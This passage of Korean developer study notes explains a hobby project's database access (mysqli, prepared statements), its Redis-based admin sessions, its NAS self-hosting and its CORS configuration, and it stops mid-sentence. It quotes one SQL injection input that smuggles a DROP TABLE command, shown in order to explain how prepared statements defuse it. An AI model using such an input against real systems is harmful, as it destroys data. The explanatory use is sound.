Synology 패키지 센터가 기본으로 제공하는 관계형 DB 패키지가 MariaDB다. 클라우드였다면 AWS RDS에서
MySQL이든 MariaDB든 원하는 걸 고를 수 있었겠지만, "이미 갖고 있는 개인 NAS를 활용한다"는 이
프로젝트의 더 상위 결정(→ 인프라 문서 참고) 때문에, DB 선택은 사실상 NAS가 뭘 기본 지원하느냐로
정해졌다.

### `mysqli`를 쓴다는 것

PHP에서 MySQL 계열 DB에 접속하는 방법은 크게 세 가지 역사가 있다:

1. **`mysql_*` 함수들** — PHP 초창기 방식. 보안 문제(SQL 인젝션에 취약)와 설계 문제로 PHP 7에서
   완전히 제거됐다. 지금은 존재하지 않는다.
2. **`mysqli`** — `mysql_*`를 대체하기 위해 나온 확장. 절차적 스타일(`mysqli_query($conn, ...)`)과
   객체지향 스타일(`$conn->query(...)`)을 둘 다 지원한다. RottenNobleProject는 객체지향 스타일을
   쓴다.
3. **PDO(PHP Data Objects)** — DB 종류에 상관없이 같은 인터페이스로 접속할 수 있게 만든 더 최신
   추상화 계층. MySQL/MariaDB뿐 아니라 PostgreSQL, SQLite 등도 같은 코드 패턴으로 다룰 수 있다.

이 프로젝트는 현재 `mysqli`를 쓰고 있고, 실제로 `02_CODING_CONVENTION.md`에는 이걸 점진적으로
PDO로 옮겨가는 게 목표라고 기록돼 있다. `mysqli`가 당장 동작하지 않는 건 아니지만, DB를 바꿀
가능성이 조금이라도 있거나 여러 DB를 동시에 지원해야 한다면 PDO 쪽이 더 유연하다.

### SQL 인젝션과 prepared statement

`get_posts.php`처럼 사용자 입력이 전혀 안 들어가는 조회는 `$conn->query($sql)`로 SQL 문자열을
그대로 실행해도 안전하다. 하지만 사용자 입력(제목, 내용, 글 id 등)이 SQL에 섞여 들어가는
엔드포인트는 반드시 **prepared statement**를 쓴다:

```php
// backend/create_post.php
$stmt = $conn->prepare("INSERT INTO posts (title, content) VALUES (?, ?)");
$stmt->bind_param("ss", $title, $content);
$stmt->execute();
```

`?`는 값이 들어갈 자리를 미리 비워두는 자리표시자(placeholder)다. `bind_param("ss", ...)`의
`"ss"`는 뒤에 오는 두 값이 둘 다 문자열(string)이라는 타입 지정이다. 이렇게 하면 사용자가 제목
칸에 `'; DROP TABLE posts; --` 같은 걸 입력해도, DB는 그걸 "실행할 SQL 코드"가 아니라 "title
컬럼에 들어갈 순수한 문자열 값"으로만 취급한다 — SQL 인젝션이 원천적으로 막히는 이유다.

### 스키마 관리 — 마이그레이션 도구 없이 수동으로

```sql
-- backend/sql/schema.sql
CREATE TABLE IF NOT EXISTS posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    content TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

Laravel의 마이그레이션 시스템처럼 "스키마 변경 이력을 코드로 관리하고 자동으로 적용"하는 도구가
없다. 대신 `schema.sql` 파일 하나에 "지금 이 시점의 최종 스키마"를 적어두고, 로컬 XAMPP와 NAS
MariaDB 양쪽에 사람이 수동으로 반영한다. 테이블이 두 개뿐인 지금 규모에서는 이 정도로 충분하지만,
테이블이 늘어나거나 스키마 변경 이력을 추적해야 할 필요가 커지면 마이그레이션 도구 도입이 필요해질
지점이다 — 실제로 문서에도 "테이블이 더 늘면 도입 검토"라고 명시돼 있다.

## 비교표

| 항목 | MariaDB (이 프로젝트) | MySQL | PostgreSQL |
|---|---|---|---|
| 관계 | MySQL의 오픈소스 포크 | 원조, 현재 오라클 소유 | 별도 계보의 오픈소스 RDBMS |
| SQL 문법 호환성 | MySQL과 거의 동일 | - | 문법이 다름(더 표준 SQL에 가까움) |
| 라이선스 | 완전 오픈소스(GPL) 유지 | 오라클 소유, 상용 버전 존재 | 오픈소스(PostgreSQL 라이선스) |
| 이 프로젝트가 고른 이유 | Synology NAS 기본 지원 DB | (선택 안 함) | (선택 안 함) |

| PHP 접속 방식 | `mysqli` (현재 사용 중) | PDO |
|---|---|---|
| DB 종류 독립성 | MySQL 계열 전용 | 여러 DB를 같은 인터페이스로 |
| 이 프로젝트 상태 | 현재 사용, 점진적 전환 예정 | 목표 상태(미착수) |

## 질문

- **Q. `mysqli`에서 PDO로 바꾸면 실제로 뭐가 좋아지나?**
  A. 지금 당장은 MariaDB 하나만 쓰니 체감 이득이 크지 않다. 다만 PDO는 예외(exception) 기반 에러
  처리가 더 일관적이고, 코드 스타일이 DB 종류에 덜 종속적이어서 나중에 테스트용으로 SQLite를
  섞어 쓰는 등의 유연성이 생긴다.

- **Q. prepared statement 없이 `$conn->query()`로 사용자 입력을 넣으면 항상 위험한가?**
  A. 그렇다. 지금 `get_posts.php`·`get_guestbook.php`처럼 사용자 입력이 전혀 안 섞이는 SQL은
  `query()`로 실행해도 안전하지만, 조금이라도 사용자 입력이 SQL 문자열 조합에 들어간다면 반드시
  prepared statement로 바꿔야 한다. 이 프로젝트는 실제로 입력을 받는 모든 엔드포인트
  (`create_post.php`, `get_post.php`의 `?id=` 등)에서 이미 prepared statement를 쓰고 있다.

## 예시 코드

```php
// backend/get_post.php — id 파라미터가 있는 조회는 prepared statement로
$id = $_GET['id'] ?? null;
if ($id === null) {
    send_error('id가 필요합니다.', 400);
}

$stmt = $conn->prepare("SELECT id, title, content, created_at FROM posts WHERE id = ?");
$stmt->bind_param("i", $id); // "i" = integer
$stmt->execute();
$result = $stmt->get_result();
```

`bind_param`의 첫 인자가 각 값의 타입을 알려주는 문자열이라는 점을 기억해두면 좋다 — `i`는 정수,
`s`는 문자열, `d`는 실수, `b`는 바이너리(BLOB)다.

## 플로우차트

(생략 — 데이터 흐름이 "요청 → prepared statement 바인딩 → 실행 → 결과 반환"으로 선형적이라 표와
코드 예시만으로 충분하다.)

## 실무

실무에서는 MySQL과 MariaDB 둘 다 여전히 널리 쓰이고, 대부분의 팀은 "이미 어느 쪽 인프라를 쓰고
있느냐"로 선택이 정해지는 경우가 많다 — 이 프로젝트가 정확히 그런 사례다. PHP 진영에서는 이제
`mysqli`보다 PDO를 새 프로젝트의 기본으로 권장하는 분위기가 강하고, Laravel 같은 프레임워크는 아예
PDO 위에 자체 쿼리 빌더/ORM(Eloquent)을 얹어서 SQL을 직접 안 써도 되게 만든다. Prepared statement는
"SQL 인젝션 방지"의 실무 표준으로, 이 프로젝트가 이미 지키고 있는 부분이다.

# Redis — 로그인부터 세션 만료까지, 무슨 순서로 일어나나

> `Redis.md`의 별첨 플로우차트. 작성 규칙은
> `DevelopPrompt/Unity/VISUALIZE_RULE/04_MERMAID_STYLE.md` §8(sequenceDiagram)을 따른다.
> 기준 시점: 2026-09-08

```mermaid
sequenceDiagram
    participant U as Browser
    participant L as login.php
    participant R as Redis
    participant E as create_post.php

    U->>L: username/password
    L->>L: password_verify
    L->>R: SET admin_session token EX 86400
    R-->>L: OK
    L-->>U: token

    U->>E: POST + Authorization Bearer token
    E->>R: GET admin_session token
    alt 토큰 유효
        R-->>E: "admin"
        E-->>U: 201 저장 완료
    else 만료 또는 위조
        R-->>E: nil
        E-->>U: 401 로그인 필요
    end
```

**읽는 법**: `->>`는 요청, `-->>`는 응답. `SET ... EX 86400`이 실행된 순간부터 24시간 뒤 Redis가
그 키를 자동으로 지운다 — 이 그림엔 "24시간 후" 시점이 별도로 안 나오지만, 그 시점 이후엔 `alt`의
"만료" 분기가 항상 선택된다는 뜻이다.

**핵심**: 토큰 자체는 클라이언트(브라우저)가 들고 있고, 그 토큰이 유효한지는 매 요청마다 Redis에
물어봐야 알 수 있다 — 서버(PHP)는 토큰의 유효성을 스스로 판단할 수 없고 항상 Redis가 최종 권한을
가진다. (이 지점이 [JWT-vs-Redis-Session.md](../Security/JWT-vs-Redis-Session.md)에서 JWT와 정반대로
갈리는 지점이다 — JWT라면 서명만 검증하면 되므로 이 그림의 `E->>R` / `R-->>E` 두 화살표 자체가
없어진다.)

<script type="text/markdown" data-name="ComputerScience/Infrastructure/Redis.md">
# Redis

---

- **카테고리**: 웹 개발, 인프라
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project` (`RottenNoble-HttpServer`, `RottenNoble-TCPServer`와 인스턴스 공유)

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 2~3회차(아키텍처 계층, 인증 흐름)에서
나온 주제. `STUDY-01`(JWT vs Redis 세션)의 배경 지식이기도 하다.

## 정의

Redis는 데이터를 디스크가 아니라 메모리에 저장하는 key-value 데이터베이스다. "메모리에 저장한다"는
말은 곧 "읽고 쓰는 속도가 매우 빠르지만, 서버가 꺼지면 기본적으로 데이터가 사라질 수 있다"는 뜻이다
(디스크에 스냅샷을 남기는 옵션도 있지만, 이 프로젝트는 그런 영속성이 필요 없는 데이터에만 Redis를
쓴다). MariaDB 같은 관계형 DB가 "오래 보관해야 하는 구조화된 데이터"를 위한 것이라면, Redis는
"잠깐 있다가 사라져도 되는 데이터, 혹은 아주 빠르게 조회해야 하는 데이터"를 위한 도구다.

## 요약

RottenNobleProject는 관리자 로그인 세션 토큰 하나를 저장하는 데만 Redis를 쓴다 — DB에 영구 저장할
필요는 없지만(하루 지나면 자동으로 사라져야 함) 매 요청마다 빠르게 확인해야 하는 데이터라, 이
프로젝트가 가진 두 가지 저장소(MariaDB, Redis)의 역할이 정확히 나뉘어 있다.

## 상세

### 왜 세션을 MariaDB가 아니라 Redis에 두나

세션 토큰을 MariaDB의 `sessions` 테이블 같은 곳에 저장할 수도 있었다. 하지만 그렇게 하면 두 가지가
아쉬워진다. 첫째, 만료 처리를 직접 짜야 한다 — "24시간 지난 row는 지운다"는 로직을 크론잡이나
별도 코드로 돌려야 한다. 둘째, 로그인 여부 확인이라는 아주 잦은 작업(글쓰기 페이지에 들어갈 때마다,
글을 저장할 때마다)에 매번 관계형 DB 조회가 끼어든다.

Redis는 이 두 문제를 기본 기능으로 해결해준다. `SET key value EX 86400`처럼 값을 저장할 때 만료
시간(TTL, Time To Live)을 같이 지정하면, Redis가 알아서 그 시간이 지난 키를 지워준다 — 별도의
정리 코드가 필요 없다. 그리고 메모리 기반이라 조회 속도가 디스크 기반 DB보다 훨씬 빠르다.

```php
// backend/login.php — 실제 코드
$redis->set("admin_session:$token", 'admin', 86400); // 24시간 뒤 자동 삭제
```

### RESP 프로토콜을 직접 구현한 이유

보통 PHP에서 Redis를 쓰려면 `phpredis`라는 C 확장을 설치하거나, Composer로 `predis` 같은 라이브러리
패키지를 받는다. 이 프로젝트는 둘 다 쓰지 않고, `backend/lib/redis_client.php`에 최소한의 Redis
클라이언트를 직접 구현했다:

```php
// backend/lib/redis_client.php
private function command(array $args)
{
    $cmd = '*' . count($args) . "\r\n";
    foreach ($args as $arg) {
        $cmd .= '$' . strlen($arg) . "\r\n" . $arg . "\r\n";
    }
    fwrite($this->socket, $cmd);
    return $this->readReply();
}
```

이건 Redis가 클라이언트-서버 통신에 쓰는 **RESP(REdis Serialization Protocol)**라는 텍스트 기반
프로토콜을 그대로 손으로 구현한 것이다. `*2\r\n$3\r\nGET\r\n$3\r\nfoo\r\n`처럼, "배열 원소 몇
개인지"와 "각 문자열이 몇 바이트인지"를 프로토콜 자체에 미리 적어주는 방식이라 파싱이 비교적
단순하다 — 그래서 라이브러리 없이도 소켓 통신 코드 80줄 정도로 GET/SET/DEL을 구현할 수 있었다.

**왜 굳이 이렇게 했을까.** 주석에 답이 있다 — `RottenNoble-HttpServer`(Node.js)와
`RottenNoble-TCPServer`(C++, hiredis 라이브러리 사용)가 **완전히 같은 Redis 인스턴스**를, 완전히
같은 커맨드 패턴(`SET key value EX seconds` / `GET` / `DEL`)으로 공유한다. 세 개의 서로 다른 언어가
같은 저장소를 다루는 상황에서, PHP만 특정 라이브러리(`phpredis`나 `predis`)의 고유한 동작 방식에
의존하면, 그 라이브러리가 프로토콜을 미묘하게 다르게 다루는 경우(타임아웃 처리, 재연결 정책 등)
디버깅이 "이게 Redis 문제인지 라이브러리 문제인지" 구분하기 어려워질 수 있다. 프로토콜을 직접
구현하면 세 언어가 정확히 같은 저수준 동작을 하고 있다는 걸 코드로 보장할 수 있다.

## 비교표

| 항목 | Redis (이 프로젝트의 세션 저장) | MariaDB 세션 테이블 | PHP 기본 세션(`$_SESSION`, 파일 기반) |
|---|---|---|---|
| 저장 위치 | 메모리 | 디스크 | 서버 로컬 디스크(파일) |
| 자동 만료(TTL) | 기본 기능(`EX`) | 직접 구현 필요 | `session.gc_maxlifetime` 설정으로 가능하나 즉시 삭제는 아님 |
| 여러 서버(Node/C++/PHP)에서 공유 | 가능 (실제로 이렇게 쓰임) | 가능 | 어려움(파일이 서버 로컬에 묶임) |
| 조회 속도 | 매우 빠름(메모리) | 상대적으로 느림(디스크) | 빠름(로컬 파일) |

## 질문

- **Q. Redis에 저장된 걸 서버를 재시작하면 잃어버리지 않나?**
  A. 기본 설정으로는 그렇다. Redis는 옵션으로 디스크에 스냅샷(RDB)이나 변경 로그(AOF)를 남겨
  재시작 후 복구할 수도 있지만, 이 프로젝트의 세션 토큰처럼 "어차피 24시간 뒤엔 사라져야 하고,
  없어지면 그냥 다시 로그인하면 되는" 데이터에는 그런 영속성이 필요 없다 — 관리자 한 명만 쓰는
  개인 블로그라 세션이 날아가도 재로그인 한 번으로 끝난다.

- **Q. `phpredis`나 `predis`를 안 쓴 게 정말 합리적인 선택이었을까?**
  A. 트레이드오프가 있다. 직접 구현한 클라이언트는 GET/SET(EX)/DEL 세 개 명령만 지원하는데, 이
  프로젝트는 딱 그 세 개만 필요해서 지금은 문제가 없다. 하지만 나중에 Redis의 다른 기능(예:
  리스트, 트랜잭션, Pub/Sub)이 필요해지면 직접 구현을 계속 확장해야 하고, 그건 검증된 라이브러리를
  쓰는 것보다 버그가 생길 여지가 크다. "지금 필요한 것만 최소로 구현한다"는 선택이 지금 규모에는
  맞지만, 확장성과는 맞바꾼 결정이다.

## 예시 코드

```php
// backend/auth.php — 실제로 세션을 확인하는 코드
function require_admin(): void
{
    $header = get_authorization_header();
    if (!$header || !preg_match('/^Bearer\s+(.+)$/', $header, $m)) {
        send_error('로그인이 필요합니다.', 401);
    }
    $token = $m[1];

    $redis = redis_connect();
    $value = $redis->get("admin_session:$token");
    $redis->close();

    if ($value !== 'admin') {
        send_error('세션이 유효하지 않거나 만료되었습니다.', 401);
    }
}
```

`admin_session:{token}`이라는 키 이름 패턴 자체가 이미 하나의 관례다 — 콜론(`:`)으로 네임스페이스를
나누는 건 Redis 커뮤니티에서 흔히 쓰는 키 네이밍 방식이다.

## 플로우차트

로그인부터 보호된 요청까지, 시간 순서로 무슨 일이 일어나는지는 순서가 중요한 정보라 그림으로
남겨둔다.

→ [`Redis.flow.md`](./Redis.flow.md)

## 실무

실무에서 Redis는 세션 저장소 외에도 캐시(자주 조회되는 DB 쿼리 결과를 잠깐 저장), 실시간 랭킹
(Sorted Set), 메시지 큐(Pub/Sub이나 Streams), 분산 락 등 아주 다양하게 쓰인다. "세션 하나만 위해
Redis를 새로 띄운다"는 이 프로젝트의 쓰임새는 실무 기준으로는 다소 미니멀한 편이지만, 세 개의 다른
언어 서버가 같은 인증 상태를 공유해야 하는 시나리오 자체는 마이크로서비스 환경에서 실제로 자주
나오는 요구사항이다. 실무에서는 대부분 `phpredis`(성능 우선) 또는 Predis(설치가 쉬움) 같은 검증된
라이브러리를 쓰고, RESP 프로토콜을 직접 구현하는 경우는 거의 없다 — 이 프로젝트처럼 "여러 언어가
프로토콜 차이 없이 완전히 동일하게 동작해야 한다"는 특수한 이유가 있을 때만 고려해볼 만한
선택이다.

## 같이 보기

- [JWT vs Redis 세션](../Security/JWT-vs-Redis-Session.md) — 이 Redis 세션 방식과 JWT의 실질적 비교(`STUDY-01`)
- [PHP](../WebDevelopment/PHP.md) — `redis_client.php`가 속한 언어, 소켓 통신(`fsockopen`) 사용
- [MariaDB](../Database/MariaDB.md) — 같은 프로젝트에서 영구 데이터를 담당하는 다른 저장소

<script type="text/markdown" data-name="ComputerScience/Infrastructure/Self-Hosting-vs-Cloud.md">
# 자체 호스팅(Synology NAS) vs 클라우드

---

- **카테고리**: 인프라, 네트워크
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `04_CURRENT_PROJECT.md`의 인프라 제약 항목, `RottenNobleProject-Architecture.md`
1회차(환경/스택)에서 나온 주제.

## 정의

웹 서비스를 인터넷에 띄우는 방법은 크게 두 갈래다. **클라우드**(AWS, GCP, Azure 등)는 다른
회사가 소유·관리하는 서버 자원을 필요한 만큼 빌려 쓰는 방식이고, **자체 호스팅(self-hosting)**은
개인이나 조직이 직접 소유한 하드웨어(이 프로젝트의 경우 가정용 NAS)를 서버로 운영하는 방식이다.

## 요약

RottenNobleProject가 Synology NAS를 프로덕션 서버로 고른 이유는 "기술적으로 더 낫다"가 아니라
"이미 개인적으로 갖고 있는 하드웨어가 있으니 계속 돈이 드는 클라우드를 쓸 이유가 없다"는 아주
실용적인 판단이었다 — 대신 그 대가로 클라우드였다면 안 겪었을 인프라 함정들을 여러 번 직접
마주쳤다.

## 상세

### 왜 NAS를 골랐나

`04_CURRENT_PROJECT.md`에 남아있는 이유는 명확하다: "AWS 등 클라우드는 계속 비용이 드는데,
이미 개인용으로 갖고 있는 NAS가 있어서 그걸 활용 — 돈을 내면서 클라우드 쓸 이유가 없다는 판단."
이건 순수하게 비용 관점의 결정이고, 동시에 이 프로젝트의 또 다른 목표인 "직접 인프라를 만져보는
경험" 자체가 학습 목표 중 하나라는 점과도 맞아떨어진다 — 클라우드의 관리형 서비스는 이런 종류의
인프라 디테일을 대부분 가려주기 때문에, 오히려 "덜 편한" NAS 쪽이 배울 게 더 많다.

### 이 선택이 실제로 만들어낸 제약들

일단 NAS로 정해지자, 그 뒤의 여러 기술 선택이 거기서 역산됐다:

- **DB가 MariaDB인 이유** — Synology 패키지 센터가 기본 지원하는 관계형 DB가 MariaDB라서
  ([MariaDB](../Database/MariaDB.md) 참고). 클라우드였다면 RDS에서 MySQL/PostgreSQL/MariaDB 중 자유롭게
  골랐을 것이다.
- **로컬 개발 환경이 XAMPP인 이유** — 프로덕션이 Apache 기반 Web Station이라, 로컬도 같은
  Apache+PHP 조합으로 맞춰서 "로컬에서 되면 배포해서도 될 확률"을 높이려는 판단.
- **포트/인증서 함정들** — 클라우드 로드밸런서나 관리형 인증서 서비스(AWS Certificate Manager
  등)를 쓴다면 자동으로 처리됐을 일들(포트 충돌, ACME 챌린지 라우팅)을 전부 직접 겪었다
  ([HTTPS & Mixed Content](../Network/HTTPS-and-Mixed-Content.md) 참고).

### 클라우드였다면 안 겪었을 것, 그래도 얻은 것

이 프로젝트가 실제로 겪은 함정들(`MEMO-WEB-06`에 기록된 7개 항목 — 경로 인식 실패, PHP 프로파일
미등록, 포트 충돌, 인증서 발급 실패 등)은 대부분 "관리형 클라우드 서비스였다면 애초에 신경 쓸
필요가 없었을" 종류의 문제다. AWS Elastic Beanstalk나 관리형 RDS를 썼다면, 포트 충돌이나 PHP
런타임 등록 같은 걸 사용자가 직접 만질 일이 거의 없다.

반대로, 바로 그 "직접 만져야 했다"는 점이 이 프로젝트의 학습 목표(인프라 경험) 관점에서는
얻은 것이기도 하다 — 포트포워딩이 무엇이고 왜 필요한지, ACME 챌린지가 실제로 어떻게 동작하는지,
가상 호스트가 무엇인지를 추상화된 클라우드 콘솔 뒤에 숨지 않고 직접 부딪혀보며 배웠다.

## 비교표

| 항목 | Synology NAS 자체 호스팅 (이 프로젝트) | 클라우드(AWS 등) |
|---|---|---|
| 비용 구조 | 하드웨어를 이미 보유 — 추가 비용 거의 없음(전기세 제외) | 사용량에 비례한 지속적 과금 |
| 초기 설정 난이도 | 높음(포트·가상 호스트·인증서를 직접 설정) | 낮음(관리형 서비스가 대부분 처리) |
| 장애 시 복구 | 직접 진단·복구(NAS가 죽으면 서비스 전체 중단) | 관리형 서비스의 이중화/자동 복구 옵션 |
| 확장성(트래픽 급증 대응) | 하드웨어 성능에 물리적으로 제한됨 | 필요에 따라 자동/수동 확장 가능 |
| 인프라 학습 효과 | 큼(포트·인증서·가상 호스트를 직접 다룸) | 작음(대부분 추상화되어 안 보임) |
| 이 프로젝트가 고른 이유 | 비용 + 인프라 직접 경험이라는 학습 목표 | (선택 안 함) |

## 질문

- **Q. 트래픽이 갑자기 늘어나면 NAS로 버틸 수 있나?**
  A. 개인 포트폴리오 블로그 규모(방문자가 아주 많지 않음)에서는 문제가 없지만, 만약 어떤 계기로
  트래픽이 크게 늘어난다면 가정용 인터넷 회선의 업로드 대역폭과 NAS의 처리 성능이 물리적인
  한계가 된다. 클라우드였다면 이런 상황에서 서버를 더 붙이거나 사양을 올리는 게 몇 분 안에
  가능하지만, NAS는 하드웨어를 바꾸지 않는 한 그 한계를 넘을 수 없다.

- **Q. NAS가 고장 나거나 정전이 나면 어떻게 되나?**
  A. 서비스가 그대로 중단된다. 클라우드의 여러 가용 영역(availability zone)에 걸친 이중화 같은
  장치가 이 구성엔 없다 — 이것도 "개인 프로젝트라 감수 가능한" 리스크와, "실제 상업 서비스라면
  받아들이기 어려운" 리스크의 경계를 보여주는 지점이다.

# CORS (Cross-Origin Resource Sharing)

---

- **카테고리**: 웹 개발, 네트워크/보안
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 3회차(프런트-백엔드 통신)에서 발견한
문서-코드 불일치(`MEMO-WEB-02`)를 계기로 CORS 자체를 별도 주제로 분리.

## 정의

브라우저는 기본적으로 "같은 origin(같은 프로토콜+도메인+포트)에서 온 요청만 자유롭게 허용"하는
**동일 출처 정책(Same-Origin Policy)**을 따른다. `https://rotten-noble.com`에서 실행되는
자바스크립트가 `https://api.other-site.com`으로 요청을 보내려 하면, 브라우저가 기본적으로 그
응답을 자바스크립트가 읽지 못하게 막는다. CORS는 서버가 "이 origin에서 오는 요청은 허용한다"고
응답 헤더로 명시적으로 선언해서, 이 기본 차단을 **의도적으로 풀어주는** 메커니즘이다.

## 요약

CORS는 "다른 사이트의 공격을 막는 방화벽"이 아니라 "브라우저가 기본으로 막아둔 것을 서버가 골라서
풀어주는 허가증"이다 — 이 구분을 놓치면 와일드카드(`*`)가 왜 위험할 수 있는지 이해하기 어렵다.

## 상세

### 왜 브라우저가 이런 걸 막아두나

만약 이 정책이 없다면, 사용자가 은행 사이트에 로그인한 상태로 악성 사이트를 방문했을 때, 그
악성 사이트의 자바스크립트가 사용자 몰래 은행 사이트에 요청을 보내고 그 응답(계좌 정보 등)을
읽어갈 수 있다. 브라우저는 쿠키 같은 인증 정보를 origin과 무관하게 자동으로 요청에 실어 보내기
때문에, 이런 요청은 사용자가 로그인한 상태 그대로 나간다 — 그래서 "응답을 읽는 것"만이라도
막아야 한다.

### `RottenNoble-Project`가 CORS를 다루는 방식

이 프로젝트는 개발 환경에서 프런트(`localhost:3000`)와 백엔드(`localhost`, Apache 80번)가 서로
다른 포트라 이미 다른 origin이었다. 그래서 백엔드 모든 엔드포인트가 `response.php`의
`allow_cors()` 함수를 거친다:

```php
// backend/response.php
function allow_cors(array $methods = ['GET']): void
{
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: ' . implode(', ', $methods) . ', OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');

    if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
        http_response_code(204);
        exit;
    }
}
```

세 가지 일이 여기서 일어난다.

1. **`Access-Control-Allow-Origin: *`** — "어떤 origin에서 온 요청이든 이 응답을 읽어도 된다"는
   선언. 와일드카드(`*`)는 "모든 origin 허용"을 뜻한다.
2. **`Access-Control-Allow-Methods`/`Allow-Headers`** — 어떤 HTTP 메서드와 헤더를 쓸 수 있는지
   알려준다.
3. **`OPTIONS` 프리플라이트 처리** — `Content-Type: application/json`처럼 "단순 요청"의 조건을
   벗어나는 요청을 보내기 전에, 브라우저는 먼저 `OPTIONS` 메서드로 "이 요청 보내도 되냐"고 서버에
   먼저 물어본다(프리플라이트). 서버가 204(내용 없음)로 답하며 위 헤더들을 실어 보내면, 브라우저가
   그제서야 실제 요청을 보낸다.

### 발견한 문제 — 문서화된 결정과 실제 코드가 갈라진 지점

`CODE_MEMO.md`의 `MEMO-WEB-02`는 이 와일드카드를 처음 붙일 때(공개 GET 엔드포인트 대상) 이렇게
명시적으로 경고해뒀다:

> "관리자 글쓰기/수정 같은 인증 붙는 엔드포인트를 추가할 때 이 와일드카드를 그대로 복사하면 안
> 된다 — 그때는 쿠키/토큰이 오가므로 명시적 origin 허용목록으로 바꿔야 한다."

하지만 실제로는 `login.php`, `create_post.php`, `update_post.php`, `delete_post.php`가 전부
공유 함수 `allow_cors()`를 그대로 호출해서, 경고했던 그 와일드카드를 그대로 쓰고 있다.

### 왜 지금 당장 위험하지 않은가 — 쿠키 vs 헤더 토큰의 차이

여기서 CORS를 제대로 이해하려면 한 가지를 짚어야 한다. **CORS 응답 헤더는 "요청을 막는 것"이
아니라 "응답을 읽는 것을 막는 것"**이다. 즉, `evil.com`의 스크립트가 이 프로젝트의
`create_post.php`에 요청을 보내는 것 자체는 CORS와 무관하게 가능하다 — 문제는 "그 요청이 실제로
인증된 상태로 처리되는가"다.

- **쿠키 기반 인증이었다면**: 브라우저는 쿠키를 origin과 무관하게 자동으로 실어 보낸다. 사용자가
  관리자로 로그인한 상태에서 `evil.com`을 열기만 해도, 그 페이지의 스크립트가 보낸 요청에 관리자
  쿠키가 자동으로 따라붙어 서버가 진짜 관리자 요청으로 착각한다 — 이게 CSRF(Cross-Site Request
  Forgery)다. 이 경우 와일드카드 CORS는 공격자가 응답까지 읽을 수 있게 해줘서 피해를 키운다.
- **이 프로젝트처럼 `Authorization: Bearer {token}` 헤더 기반이라면**: 브라우저는 이 헤더를 절대
  자동으로 붙여주지 않는다. `evil.com`의 스크립트가 토큰 값 자체를 모르면(다른 origin의
  `localStorage`는 읽을 수 없다) 애초에 유효한 요청을 만들 수조차 없다. 그래서 와일드카드가
  남아있어도 클래식 CSRF 경로 자체가 막혀 있다.

**다만** 이건 "설계자가 CORS까지 고려해서 헤더 토큰을 선택했다"는 뜻은 아니다 — `MEMO-WEB-04`를
보면 헤더 토큰을 고른 이유는 어디까지나 기존 인프라(Redis 세션)와의 일관성이었고, CORS와의
상호작용은 별도로 언급되지 않는다. 결과적으로 안전한 조합이 된 것이지, 그렇게 설계된 것은 아니라는
차이를 구분해서 봐야 한다.

## 비교표

| 항목 | 와일드카드(`*`) | 명시적 origin 허용목록 |
|---|---|---|
| 설정 난이도 | 매우 쉬움 | origin이 바뀔 때마다 코드 수정 필요 |
| 쿠키 기반 인증과 함께 쓸 때 | 위험(CSRF 응답 탈취 가능) | 안전(허용된 origin만 응답 읽기 가능) |
| 헤더 토큰 기반 인증과 함께 쓸 때 | 상대적으로 안전(토큰을 몰라서 못 뚫음) | 더 안전(방어선이 하나 더 있음) |
| 이 프로젝트의 현재 상태(~2026-09-09) | PHP 시절엔 전체 엔드포인트에 적용 중이었고, 실제 배포된 Spring Boot 백엔드도 다시 와일드카드다 — 아래 "2026-09-09 갱신" 참고 | PHP용 패치(PR #2)가 이 방향으로 준비됐으나 **머지 없이 close됨** — 실제 배포된 코드엔 반영된 적 없음 |

## 질문

- **Q. `credentials: 'include'`(쿠키 포함 요청)와 와일드카드를 같이 쓸 수 있나?**
  A. 아니다. 브라우저 스펙 자체가 이걸 막는다 — `Access-Control-Allow-Origin: *`와
  `Access-Control-Allow-Credentials: true`를 동시에 쓰는 응답은 브라우저가 거부한다. 쿠키를
  쓰려면 반드시 구체적인 origin을 명시해야 한다. 이 프로젝트가 애초에 쿠키가 아니라 헤더 토큰을
  썼기 때문에 이 제약 자체를 마주칠 일이 없었다.

- **Q. `OPTIONS` 프리플라이트는 왜 모든 요청에 안 일어나나?**
  A. `GET`/`POST`이면서 `Content-Type`이 `application/x-www-form-urlencoded` 등 특정 조건을
  만족하는 "단순 요청"은 프리플라이트 없이 바로 나간다. 이 프로젝트는 `Content-Type:
  application/json`을 쓰는 POST 요청이 많아서(단순 요청 조건을 벗어남) 프리플라이트가 실제로
  발생한다 — `allow_cors()`가 `OPTIONS`를 별도로 처리해두지 않았다면 이 요청들이 전부 실패했을
  것이다.

## 예시 코드

```
// 브라우저가 실제로 보내는 프리플라이트 요청 (create_post.php 호출 전)
OPTIONS /backend/create_post.php HTTP/1.1
Origin: https://rotten-noble.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
```

```php
// 서버가 응답해야 하는 헤더 (2026-09-08 이전 allow_cors()가 실제로 만들던 것 — 지금은 아래 참고)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
HTTP/1.1 204 No Content
```

```php
// 2026-09-08 이후 — 요청 Origin이 허용목록에 있을 때만 그 origin을 그대로 반사한다
Access-Control-Allow-Origin: https://rotten-noble.com
Vary: Origin
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
HTTP/1.1 204 No Content
```

## 플로우차트

(생략 — "요청 전에 프리플라이트가 한 번 더 오간다"는 흐름은 위 예시 코드 두 블록의 순서로 이미
충분히 전달된다.)

## 실무

실무에서는 프로덕션 API에 와일드카드를 그대로 쓰는 경우는 드물다 — 대부분 프런트엔드가 배포된
실제 도메인만 허용목록에 넣는다. 다만 이 프로젝트처럼 "인증 방식이 쿠키가 아니라 헤더/토큰
기반"이라면 실무에서도 와일드카드를 잠정적으로 허용하는 경우가 있다(공개 API, 여러 클라이언트가
